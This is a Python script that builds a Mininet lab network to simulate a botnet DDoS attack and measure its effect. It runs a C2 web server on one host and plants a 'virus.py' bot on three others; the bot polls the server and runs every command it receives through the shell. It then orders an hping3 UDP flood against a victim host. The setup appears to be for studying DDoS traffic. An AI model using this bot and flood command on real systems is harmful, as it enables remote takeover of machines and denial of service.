import itertools
import time
from pathlib import Path
from subprocess import Popen
from typing import List

from mininet.net import Mininet
from mininet.node import OVSController

from topo import DDOSTopo


def cprint(text, sep=" ", end="\n"):
    print(f"\033[96m{text}\033[0m", sep=sep, end=end)


def ping(source, target, times=1, timeout=1) -> List[float]:
    return [source.cmd(f"ping -c 1 -w {timeout} {target.IP()} | grep time=").strip() for _ in range(times)]


results = Path("/tmp/results")
results.mkdir(exist_ok=True)

# Ensure that the network is clean
cprint("[+] Cleaning the network...")
Popen("mn -c", shell=True).wait()

# Ensure required packages are installed
cprint("[+] Installing required packages...")
Popen("apt-get update && apt-get install -y bwm-ng tcpdump hping3", shell=True).wait()

# Create a network
net = Mininet(controller=OVSController)

# Build the network
DDOSTopo.build(net)

# Start the network
cprint("[+] Starting the network...")
net.start()

cprint("[+] Checking Connectivity...")
net.pingAll()

h1, h2, h3, h4, h5, h6 = net.get('h1', 'h2', 'h3', 'h4', 'h5', 'h6')

# Run a simple webserver on h5 (attacker node (C2 Server))
cprint("[+] Setting up the C2 server...")
h6.cmd("echo 'ls' > command")
h6.cmd("python3 -m http.server 80 &> /tmp/server.log &")

cprint("    [+] Waiting for the C2 server to be ready...")
time.sleep(2)

out = h2.cmd(f"curl http://{h6.IP()}/command")
if "ls" not in out:
    cprint("[-] C2 server is not ready. Exiting...")
    print(out)
    print(h6.cmd("cat /tmp/server.log"))
    exit(1)

cprint(f"[+] C2 server is ready. ({out.strip()})")

virus = f"""import time
import urllib.request
import subprocess

url = \"http://{h6.IP()}/command\"

while True:
    response = urllib.request.urlopen(url)
    command = response.read().decode(\"utf-8\").strip()

    if command:
        subprocess.call(command, shell=True)

    time.sleep(10)
    """

cprint("[+] Simulating host infection...")
for h in [h2, h4, h5]:
    h.cmd(f"echo '{virus}' > virus.py")
    h.cmd("python3 virus.py &> /tmp/virus.log &")

cprint("[+] Hosts are infected.")

cprint("[+] Starting bandwidth monitoring tools...")
(results / "bwm-ng.log").unlink(missing_ok=True)
Popen("bwm-ng -o csv -t 1000 -u bits -T rate -C ',' > /tmp/results/bwm-ng.log &", shell=True).wait()

cprint("[+] Starting packet capture...")
for i, j in itertools.product(range(1, 4), range(1, 3)):
    (results / f"s{i}-eth{j}.pcap").unlink(missing_ok=True)
    Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/results/s{i}-eth{j}.pcap &", shell=True).wait()

time.sleep(1)

cprint("[+] Network is ready. Checking connectivity...")
net.pingAll()

cprint("[+] Network is ready. Starting the attack...")
cmd = f"sudo hping3 --flood --udp {h1.IP()} &"
cprint(f"    [+] Running: {cmd}")
h5.cmd(f"echo \"{cmd}\" > command")

cprint("    [+] Waiting for the attack to take effect...")
time.sleep(10)

cprint("    [+] Press Ctrl+C once to stop the attack...")
try:
    while True:
        print(ping(h3, h1))
        time.sleep(1)
except KeyboardInterrupt:
    pass

time.sleep(1)

cprint("[+] Stopping the attack...")

# Stop the attack
for host in [h2, h4, h5]:
    host.cmd("killall hping3")

time.sleep(2)

# Stop the monitoring
cprint("[+] Stopping bandwidth monitoring tools...")
Popen("killall bwm-ng", shell=True).wait()

# Stop the packet capture
cprint("[+] Stopping packet capture...")
Popen("killall tcpdump", shell=True).wait()

# Copy logs
cprint("[+] Copying logs...")
for host in [h2, h4, h5]:
    (results / f"{host.name}.txt").write_text(host.cmd("cat /tmp/virus.log"))

(results / "server.log").write_text(h6.cmd("cat /tmp/server.log"))

cprint("[+] Logs copied.")

cprint("[+] Stopping the network...")
try:
    net.stop()
except Exception:
    pass

cprint("[+] Network stopped.")

# Tarring the results
cprint("[+] Tarring the results...")
Popen("tar -czf /tmp/results.tar.gz -C /tmp results", shell=True).wait()

cprint("[+] Results are ready.")
cprint(f"[+] Results are saved in: {results / 'results.tar.gz'}")
